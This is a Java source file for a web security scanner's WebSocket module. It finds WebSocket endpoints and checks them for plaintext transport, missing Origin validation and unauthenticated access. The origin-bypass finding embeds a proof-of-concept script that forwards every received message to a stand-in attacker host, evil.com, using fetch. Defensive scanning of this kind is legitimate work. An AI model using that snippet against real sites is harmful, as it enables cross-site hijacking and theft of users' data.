package gg.effront.anarcry.scanner.web.websocket;

import gg.effront.anarcry.model.Finding;
import gg.effront.anarcry.model.Severity;
import gg.effront.anarcry.scanner.ScanContext;
import gg.effront.anarcry.scanner.Scanner;
import gg.effront.anarcry.scanner.util.Http;
import gg.effront.anarcry.scanner.util.HttpClientFactory;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.net.http.WebSocket;
import java.nio.ByteBuffer;
import java.time.Duration;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.CompletionStage;
import java.util.concurrent.TimeUnit;
import java.util.function.Consumer;

public class WebSocketModule implements Scanner {

    private static final List<String> WS_PATHS = List.of("/ws", "/websocket", "/socket.io", "/sockjs", "/hub",
            "/signalr", "/cable", "/realtime", "/stream", "/events", "/graphql");

    private static final long CONNECT_TIMEOUT_MS = 5000;
    private static final long DATA_WAIT_MS = 3000;

    @Override
    public String id() {
        return "WebSocket";
    }

    @Override
    public List<Finding> scan(ScanContext ctx, Consumer<String> log) throws Exception {
        List<Finding> findings = new ArrayList<>();
        HttpClient hc = HttpClientFactory.http2();

        String scheme = ctx.isHttps() ? "https" : "http";
        int defPort = ctx.isHttps() ? 443 : 80;
        String baseUrl = scheme + "://" + ctx.host() + (ctx.port() != defPort ? ":" + ctx.port() : "");

        log.accept("[~] " + id() + ": discovering WebSocket endpoints on " + baseUrl);

        // Phase 1: Discover WS endpoints via HTTP upgrade probe
        List<String> discoveredPaths = new ArrayList<>();
        for (String path : WS_PATHS) {
            if (probeWsEndpoint(ctx, hc, baseUrl, path, log)) {
                discoveredPaths.add(path);
                log.accept("[+] " + id() + ": WebSocket endpoint found at " + path);
            }
        }

        if (discoveredPaths.isEmpty()) {
            log.accept("[+] " + id() + ": nenhum endpoint WebSocket detectado");
            return findings;
        }

        log.accept("[~] " + id() + ": " + discoveredPaths.size() + " endpoint(s) found -- running security checks");

        String wsScheme = ctx.isHttps() ? "wss" : "ws";
        String wsBase = wsScheme + "://" + ctx.host() + (ctx.port() != defPort ? ":" + ctx.port() : "");

        for (String path : discoveredPaths) {
            String wsUrl = wsBase + path;

            // Phase 4: Protocol detection // nosemgrep: detect-insecure-websocket
            if (!ctx.isHttps()) { // nosemgrep: detect-insecure-websocket
                log.accept("[!] " + id() + ": unencrypted WebSocket (ws://) at " + path); // nosemgrep
                String title = "Unencrypted WebSocket (ws://) -- " + path; // nosemgrep
                findings.add(Finding.of(id(), path, title, Severity.LOW,
                        "URL: ws://" + ctx.host() + (ctx.port() != defPort ? ":" + ctx.port() : "") + path // nosemgrep
                                + " | Protocol: ws:// (plaintext)", // nosemgrep
                        "WebSocket traffic is transmitted in plaintext, allowing network-level attackers "
                                + "to intercept and modify messages via MITM.",
                        "curl -i -N -H 'Connection: Upgrade' -H 'Upgrade: websocket' "
                                + "-H 'Sec-WebSocket-Version: 13' "
                                + "-H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' " + "'http://" + ctx.host()
                                + (ctx.port() != defPort ? ":" + ctx.port() : "") + path + "'",
                        "Use wss:// (WebSocket over TLS) for all WebSocket connections. " // nosemgrep
                                + "Redirect ws:// to wss:// and enforce HSTS.")); // nosemgrep
            }

            // Phase 2: Origin check -- connect with evil origin
            checkOriginBypass(ctx, hc, wsUrl, path, findings, log);

            // Phase 3: Authentication check -- connect without credentials
            checkUnauthenticatedAccess(ctx, hc, wsUrl, path, findings, log);
        }

        if (findings.isEmpty()) {
            log.accept("[+] " + id() + ": nenhuma vulnerabilidade detectada");
        }
        return findings;
    }

    private boolean probeWsEndpoint(ScanContext ctx, HttpClient hc, String baseUrl, String path, Consumer<String> log) {
        try {
            // Send an HTTP request with WebSocket upgrade headers to detect endpoints
            HttpRequest req = HttpRequest.newBuilder().uri(URI.create(baseUrl + path)).header("Connection", "Upgrade")
                    .header("Upgrade", "websocket").header("Sec-WebSocket-Version", "13")
                    .header("Sec-WebSocket-Key", "dGhlIHNhbXBsZSBub25jZQ==").timeout(Duration.ofSeconds(6)).GET()
                    .build();
            HttpResponse<String> resp = Http.send(ctx, hc, req, HttpResponse.BodyHandlers.ofString(), id());
            int status = resp.statusCode();
            // 101 Switching Protocols = WebSocket upgrade accepted
            // 200 with certain frameworks (socket.io returns 200 with JSON)
            // 400 "Can Upgrade" -- some servers indicate WS support via 400 for bad
            // handshake
            if (status == 101) {
                return true;
            }
            // socket.io responds with 200 and JSON containing session info
            if (status == 200 && path.contains("socket.io")) {
                String body = resp.body() != null ? resp.body() : "";
                if (body.contains("sid") || body.contains("websocket")) {
                    return true;
                }
            }
            // Some servers return 426 Upgrade Required, indicating WS support
            if (status == 426) {
                return true;
            }
            return false;
        } catch (Exception e) {
            return false;
        }
    }

    private void checkOriginBypass(ScanContext ctx, HttpClient hc, String wsUrl, String path, List<Finding> findings,
            Consumer<String> log) {
        try {
            CollectingListener listener = new CollectingListener();
            CompletableFuture<WebSocket> wsFuture = hc.newWebSocketBuilder().header("Origin", "https://evil.com")
                    .connectTimeout(Duration.ofMillis(CONNECT_TIMEOUT_MS)).buildAsync(URI.create(wsUrl), listener);

            WebSocket ws = wsFuture.get(CONNECT_TIMEOUT_MS + 1000, TimeUnit.MILLISECONDS);

            // Connection succeeded with evil origin -- origin validation is missing
            log.accept("[!!] " + id() + ": CORS bypass -- WebSocket accepted Origin: https://evil.com at " + path);

            // Wait briefly for any data to arrive
            Thread.sleep(DATA_WAIT_MS);
            String receivedData = listener.collectedData();

            String evidence = "URL: " + wsUrl + " | Origin: https://evil.com | Connection: accepted";
            if (!receivedData.isEmpty()) {
                evidence += " | Data received: " + truncate(receivedData, 200);
            }

            findings.add(Finding.of(id(), path, "WebSocket Origin Bypass -- " + path, Severity.MEDIUM, evidence,
                    "The WebSocket endpoint accepts connections from arbitrary origins (https://evil.com). "
                            + "An attacker can use a malicious page to establish a cross-origin WebSocket connection "
                            + "and interact with the endpoint on behalf of a logged-in victim.",
                    "# PoC (host on https://evil.com):\n" + "const ws = new WebSocket('" + wsUrl + "');\n"
                            + "ws.onmessage = e => fetch('https://evil.com/log?d=' + encodeURIComponent(e.data));\n"
                            + "ws.onopen = () => ws.send('{\"action\":\"subscribe\"}');",
                    "Validate the Origin header on the server side before accepting the WebSocket upgrade. "
                            + "Only allow trusted origins from an explicit allowlist."));

            closeQuietly(ws);
        } catch (Exception e) {
            // Connection refused or timed out -- origin may be validated, or endpoint is
            // down
            log.accept("[~] " + id() + ": origin check for " + path + " -- connection rejected or timed out");
        }
    }

    private void checkUnauthenticatedAccess(ScanContext ctx, HttpClient hc, String wsUrl, String path,
            List<Finding> findings, Consumer<String> log) {
        // Only meaningful if the target uses authentication
        if (ctx.jwtToken().isBlank() && ctx.config().sessionCookie().isBlank()) {
            // No auth configured -- skip, as we cannot determine if unauthenticated access
            // is abnormal
            log.accept("[~] " + id() + ": skipping auth check for " + path + " -- no credentials configured");
            return;
        }

        try {
            CollectingListener listener = new CollectingListener();
            // Connect without any auth tokens or cookies
            CompletableFuture<WebSocket> wsFuture = hc.newWebSocketBuilder()
                    .connectTimeout(Duration.ofMillis(CONNECT_TIMEOUT_MS)).buildAsync(URI.create(wsUrl), listener);

            WebSocket ws = wsFuture.get(CONNECT_TIMEOUT_MS + 1000, TimeUnit.MILLISECONDS);

            // Wait for potential data
            Thread.sleep(DATA_WAIT_MS);
            String receivedData = listener.collectedData();

            if (!receivedData.isEmpty()) {
                log.accept("[!!] " + id() + ": unauthenticated WebSocket access with data at " + path);
                findings.add(Finding.of(id(), path, "Unauthenticated WebSocket Access -- " + path, Severity.HIGH,
                        "URL: " + wsUrl + " | Auth: none | Data received: " + truncate(receivedData, 200),
                        "The WebSocket endpoint accepts connections without authentication and sends data "
                                + "to unauthenticated clients. This may expose sensitive real-time data "
                                + "(messages, events, user actions) to any network client.",
                        "# Connect without auth:\nwebsocat '" + wsUrl + "'\n# Or:\n" + "const ws = new WebSocket('"
                                + wsUrl + "');\n" + "ws.onmessage = e => console.log(e.data);",
                        "Require authentication (JWT or session token) before accepting "
                                + "WebSocket upgrades. Validate credentials in the handshake phase, "
                                + "not after the connection is established."));
            } else {
                log.accept("[~] " + id() + ": unauthenticated connection accepted at " + path
                        + " but no data received -- likely benign");
            }

            closeQuietly(ws);
        } catch (Exception e) {
            // Connection rejected -- auth may be enforced
            log.accept("[~] " + id() + ": auth check for " + path + " -- connection rejected (auth may be enforced)");
        }
    }

    private static void closeQuietly(WebSocket ws) {
        try {
            ws.sendClose(WebSocket.NORMAL_CLOSURE, "scan complete").get(2, TimeUnit.SECONDS);
        } catch (Exception ignored) {
            // Best-effort close
        }
    }

    private static String truncate(String s, int max) {
        if (s.length() <= max) {
            return s;
        }
        return s.substring(0, max) + "...";
    }

    /** Minimal WebSocket listener that collects received text and binary data. */
    private static class CollectingListener implements WebSocket.Listener {

        private final StringBuilder buffer = new StringBuilder();

        @Override
        public CompletionStage<?> onText(WebSocket webSocket, CharSequence data, boolean last) {
            synchronized (buffer) {
                buffer.append(data);
            }
            webSocket.request(1);
            return CompletableFuture.completedFuture(null);
        }

        @Override
        public CompletionStage<?> onBinary(WebSocket webSocket, ByteBuffer data, boolean last) {
            synchronized (buffer) {
                buffer.append("[binary: ").append(data.remaining()).append(" bytes]");
            }
            webSocket.request(1);
            return CompletableFuture.completedFuture(null);
        }

        @Override
        public CompletionStage<?> onPing(WebSocket webSocket, ByteBuffer message) {
            webSocket.request(1);
            return CompletableFuture.completedFuture(null);
        }

        @Override
        public CompletionStage<?> onPong(WebSocket webSocket, ByteBuffer message) {
            webSocket.request(1);
            return CompletableFuture.completedFuture(null);
        }

        @Override
        public void onOpen(WebSocket webSocket) {
            webSocket.request(1);
        }

        @Override
        public CompletionStage<?> onClose(WebSocket webSocket, int statusCode, String reason) {
            return CompletableFuture.completedFuture(null);
        }

        @Override
        public void onError(WebSocket webSocket, Throwable error) {
            // Suppress -- errors are expected in security probing
        }

        String collectedData() {
            synchronized (buffer) {
                return buffer.toString();
            }
        }
    }
}
